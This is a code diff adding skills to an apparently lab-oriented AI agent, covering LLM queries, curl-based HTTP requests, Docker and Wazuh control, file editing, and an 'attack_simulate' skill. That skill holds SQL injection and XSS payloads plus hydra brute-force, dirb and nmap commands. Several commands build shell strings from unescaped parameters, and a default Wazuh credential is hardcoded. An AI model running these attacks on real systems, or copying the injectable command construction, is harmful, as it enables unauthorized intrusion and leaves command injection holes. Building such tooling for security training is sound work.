@@ -98,6 +98,72 @@ SKILLS: dict[str, dict] = {
         "target_vm": "auto",
         "requires_approval": True,
     },
+    "ollama_query": {
+        "description": "Ollama LLM API 직접 호출 — 프롬프트 전송, temperature/모델 파라미터 지정, 응답 수집",
+        "params": {
+            "prompt": {"type": "string", "description": "LLM에 보낼 프롬프트", "required": True},
+            "model": {"type": "string", "description": "사용할 모델명 (기본: 현재 모델)", "required": False},
+            "system": {"type": "string", "description": "시스템 프롬프트", "required": False},
+            "temperature": {"type": "number", "description": "temperature (0.0~2.0)", "required": False},
+            "max_tokens": {"type": "integer", "description": "최대 생성 토큰", "required": False},
+        },
+        "target_vm": "local",
+    },
+    "http_request": {
+        "description": "HTTP 요청 전송 — GET/POST/PUT/DELETE, 헤더/바디 커스터마이징, 응답 코드/헤더/바디 수집",
+        "params": {
+            "url": {"type": "string", "description": "요청 URL", "required": True},
+            "method": {"type": "string", "description": "HTTP 메서드 (GET/POST/PUT/DELETE)", "required": False},
+            "headers": {"type": "object", "description": "요청 헤더 (JSON)", "required": False},
+            "body": {"type": "string", "description": "요청 바디", "required": False},
+            "target": {"type": "string", "description": "요청을 보낼 VM (기본: attacker)", "required": False},
+        },
+        "target_vm": "attacker",
+    },
+    "docker_manage": {
+        "description": "Docker 컨테이너 관리 — ps/logs/exec/inspect/stats 등",
+        "params": {
+            "action": {"type": "string", "enum": ["ps", "logs", "exec", "inspect", "stats", "restart"],
+                       "description": "Docker 동작", "required": True},
+            "container": {"type": "string", "description": "컨테이너 이름 또는 ID", "required": False},
+            "command": {"type": "string", "description": "exec 시 실행할 명령", "required": False},
+            "target": {"type": "string", "description": "Docker가 실행 중인 VM", "required": False},
+        },
+        "target_vm": "auto",
+    },
+    "wazuh_api": {
+        "description": "Wazuh REST API 호출 — 에이전트/룰/알림 조회, 설정 변경",
+        "params": {
+            "endpoint": {"type": "string", "description": "API 경로 (예: /agents, /rules, /alerts)", "required": True},
+            "method": {"type": "string", "description": "HTTP 메서드 (GET/POST/PUT)", "required": False},
+            "body": {"type": "string", "description": "요청 바디 (JSON)", "required": False},
+        },
+        "target_vm": "siem",
+    },
+    "file_manage": {
+        "description": "파일 읽기/쓰기/검색 — 설정 파일 편집, 로그 검색, 파일 존재 확인",
+        "params": {
+            "action": {"type": "string", "enum": ["read", "write", "append", "search", "exists", "list"],
+                       "description": "파일 동작", "required": True},
+            "path": {"type": "string", "description": "파일 경로", "required": True},
+            "content": {"type": "string", "description": "write/append 시 내용", "required": False},
+            "pattern": {"type": "string", "description": "search 시 grep 패턴", "required": False},
+            "target": {"type": "string", "description": "대상 VM role", "required": False},
+        },
+        "target_vm": "auto",
+    },
+    "attack_simulate": {
+        "description": "공격 시뮬레이션 — SQLi/XSS/brute-force/포트스캔 등 사전 정의된 공격 패턴 실행",
+        "params": {
+            "attack_type": {"type": "string",
+                           "enum": ["sqli", "xss", "brute_ssh", "brute_http", "dir_scan", "port_scan"],
+                           "description": "공격 유형", "required": True},
+            "target_url": {"type": "string", "description": "대상 URL 또는 IP", "required": True},
+            "payload": {"type": "string", "description": "커스텀 페이로드 (선택)", "required": False},
+        },
+        "target_vm": "attacker",
+        "requires_approval": True,
+    },
     "probe_all": {
         "description": "전체 인프라 상태 일괄 점검 — 모든 VM의 SubAgent 상태, 서비스, 네트워크",
         "params": {},
@@ -521,7 +587,146 @@ def execute_skill(name: str, params: dict[str, Any], vm_ips: dict[str, str],
         command = params.get("command", "echo ok")
         target = params.get("target", "attacker")
         ip = _resolve_vm_ip(target, vm_ips)
-        r = run_command(ip, command, timeout=30)
+        r = run_command(ip, command, timeout=60)
         return {"success": r.get("exit_code") == 0, "output": r.get("stdout", ""), "stderr": r.get("stderr", "")}
+
+    elif name == "ollama_query":
+        import httpx
+        prompt = params.get("prompt", "")
+        q_model = params.get("model") or model or "gpt-oss:120b"
+        system = params.get("system", "")
+        temp = params.get("temperature", 0.7)
+        max_tok = params.get("max_tokens", 512)
+        messages = []
+        if system:
+            messages.append({"role": "system", "content": system})
+        messages.append({"role": "user", "content": prompt})
+        try:
+            r = httpx.post(f"{ollama_url}/api/chat", json={
+                "model": q_model, "messages": messages, "stream": False,
+                "options": {"temperature": float(temp), "num_predict": int(max_tok)},
+            }, timeout=120.0)
+            data = r.json()
+            content = data.get("message", {}).get("content", "")
+            eval_count = data.get("eval_count", 0)
+            eval_duration = data.get("eval_duration", 0)
+            tokens_per_sec = (eval_count / (eval_duration / 1e9)) if eval_duration else 0
+            return {
+                "success": True,
+                "output": content,
+                "model": q_model,
+                "tokens": eval_count,
+                "tokens_per_sec": round(tokens_per_sec, 1),
+                "temperature": temp,
+            }
+        except Exception as e:
+            return {"success": False, "output": f"Ollama API 호출 실패: {e}"}
+
+    elif name == "http_request":
+        import httpx
+        url = params.get("url", "")
+        method = params.get("method", "GET").upper()
+        headers = params.get("headers") or {}
+        body = params.get("body", "")
+        target = params.get("target", "attacker")
+        ip = _resolve_vm_ip(target, vm_ips)
+        # attacker VM에서 curl로 실행 (대상 서버에 직접 httpx 호출 아님)
+        header_args = " ".join(f"-H '{k}: {v}'" for k, v in headers.items()) if headers else ""
+        body_arg = f"-d '{body}'" if body else ""
+        cmd = f"curl -sS -o /tmp/http_resp_body -w 'HTTP_CODE:%{{http_code}}\\nSIZE:%{{size_download}}' -X {method} {header_args} {body_arg} '{url}' && echo && cat /tmp/http_resp_body | head -50"
+        r = run_command(ip, cmd, timeout=30)
+        stdout = r.get("stdout", "")
+        return {"success": "HTTP_CODE:2" in stdout or "HTTP_CODE:3" in stdout or "HTTP_CODE:4" in stdout,
+                "output": stdout, "stderr": r.get("stderr", "")}
+
+    elif name == "docker_manage":
+        action = params.get("action", "ps")
+        container = params.get("container", "")
+        target = params.get("target", "siem")
+        ip = _resolve_vm_ip(target, vm_ips)
+        if action == "ps":
+            cmd = "docker ps --format '{{.Names}}\\t{{.Status}}\\t{{.Ports}}' 2>/dev/null"
+        elif action == "logs":
+            cmd = f"docker logs --tail 30 {container} 2>&1"
+        elif action == "exec":
+            exec_cmd = params.get("command", "echo ok")
+            cmd = f"docker exec {container} {exec_cmd} 2>&1"
+        elif action == "inspect":
+            cmd = f"docker inspect {container} --format '{{{{.State.Status}}}} {{{{.RestartCount}}}} {{{{.Config.Image}}}}' 2>/dev/null"
+        elif action == "stats":
+            cmd = "docker stats --no-stream --format '{{.Name}}\\t{{.CPUPerc}}\\t{{.MemUsage}}' 2>/dev/null"
+        elif action == "restart":
+            cmd = f"docker restart {container} 2>&1"
+        else:
+            return {"success": False, "error": f"Unknown docker action: {action}"}
+        r = run_command(ip, cmd, timeout=30)
+        return {"success": r.get("exit_code") == 0, "output": r.get("stdout", ""), "stderr": r.get("stderr", "")}
+
+    elif name == "wazuh_api":
+        endpoint = params.get("endpoint", "/agents")
+        method = params.get("method", "GET").upper()
+        body = params.get("body", "")
+        ip = _resolve_vm_ip("siem", vm_ips)
+        body_arg = f"-d '{body}'" if body else ""
+        cmd = f"curl -sk -u wazuh-wui:wazuh-wui -X {method} {body_arg} 'https://localhost:55000{endpoint}' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -50"
+        r = run_command(ip, cmd, timeout=15)
+        return {"success": r.get("exit_code") == 0, "output": r.get("stdout", ""), "stderr": r.get("stderr", "")}
+
+    elif name == "file_manage":
+        action = params.get("action", "read")
+        path = params.get("path", "")
+        target = params.get("target", "manager")
+        ip = _resolve_vm_ip(target, vm_ips)
+        if action == "read":
+            cmd = f"cat {_shq(path)} 2>&1 | head -100"
+        elif action == "write":
+            content = params.get("content", "")
+            import base64
+            b64 = base64.b64encode(content.encode()).decode()
+            cmd = f"echo {b64} | base64 -d > {_shq(path)}"
+        elif action == "append":
+            content = params.get("content", "")
+            import base64
+            b64 = base64.b64encode(content.encode()).decode()
+            cmd = f"echo {b64} | base64 -d >> {_shq(path)}"
+        elif action == "search":
+            pattern = params.get("pattern", "")
+            cmd = f"grep -rn {_shq(pattern)} {_shq(path)} 2>/dev/null | head -20"
+        elif action == "exists":
+            cmd = f"test -e {_shq(path)} && echo EXISTS || echo NOT_FOUND"
+        elif action == "list":
+            cmd = f"ls -la {_shq(path)} 2>/dev/null | head -30"
+        else:
+            return {"success": False, "error": f"Unknown file action: {action}"}
+        r = run_command(ip, cmd, timeout=15)
+        return {"success": r.get("exit_code") == 0, "output": r.get("stdout", ""), "stderr": r.get("stderr", "")}
+
+    elif name == "attack_simulate":
+        attack_type = params.get("attack_type", "sqli")
+        target_url = params.get("target_url", "http://10.20.30.80")
+        payload = params.get("payload", "")
+        attacker_ip = vm_ips.get("attacker", "")
+        if attack_type == "sqli":
+            p = payload or "' OR 1=1--"
+            cmd = f"curl -sS -o /dev/null -w '%{{http_code}}\\n' '{target_url}' -d 'email={p}&password=x' && echo '---' && curl -sS '{target_url}?id=1%27%20OR%201=1--' -o /dev/null -w '%{{http_code}}\\n'"
+        elif attack_type == "xss":
+            p = payload or "<script>alert(1)</script>"
+            import urllib.parse
+            encoded = urllib.parse.quote(p)
+            cmd = f"curl -sS -o /dev/null -w '%{{http_code}}\\n' '{target_url}?q={encoded}'"
+        elif attack_type == "brute_ssh":
+            target_host = target_url.replace("http://", "").replace("https://", "").split(":")[0]
+            cmd = f"hydra -l root -P /usr/share/wordlists/rockyou.txt {target_host} ssh -t 4 -f 2>&1 | tail -10"
+        elif attack_type == "brute_http":
+            cmd = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target_url} http-post-form '/rest/user/login:email=^USER^&password=^PASS^:Invalid' -t 4 -f 2>&1 | tail -10"
+        elif attack_type == "dir_scan":
+            cmd = f"dirb {target_url} /usr/share/dirb/wordlists/common.txt -r -z 10 2>&1 | tail -20"
+        elif attack_type == "port_scan":
+            target_host = target_url.replace("http://", "").replace("https://", "").split(":")[0]
+            cmd = f"nmap -sV -T4 --top-ports 100 {target_host} 2>&1"
+        else:
+            return {"success": False, "error": f"Unknown attack type: {attack_type}"}
+        r = run_command(attacker_ip, cmd, timeout=60)
+        return {"success": True, "output": r.get("stdout", ""), "stderr": r.get("stderr", ""), "attack_type": attack_type}
 
     return {"success": False, "error": f"Skill '{name}' not implemented"}
